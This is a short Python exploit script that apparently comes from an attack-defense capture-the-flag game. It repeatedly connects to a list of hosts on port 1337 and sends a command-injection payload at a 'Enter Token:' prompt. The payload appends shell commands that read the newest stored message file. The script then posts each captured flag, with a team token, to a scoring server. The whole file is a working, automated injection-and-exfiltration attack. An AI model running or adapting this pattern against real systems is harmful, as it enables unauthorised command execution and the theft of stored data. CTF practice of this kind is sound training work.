from pwn import *
import requests
import os
address=['192.168.1.10', '192.168.1.20', '192.168.1.30', '192.168.1.40', '192.168.1.60']
context.log_level="debug"
while(True):
    for i in address:
        print (i)
        r = remote(i,1337)
        sleep(2)
        if r.can_recv():
            r.recvuntil("Your choice:")
            r.sendline('2')
            sleep(1)
            r.recvuntil("Enter Token:")
            r.sendline("12; cd /home/messagebox/msg;cat `ls -t | head -2 | tail -1`;")
            x=r.recv()
            datum={'token':'5VquqvGi','flag':x}
            y= requests.post("http://192.168.1.2:8080/submit_flag", data=datum)
            print(y.text)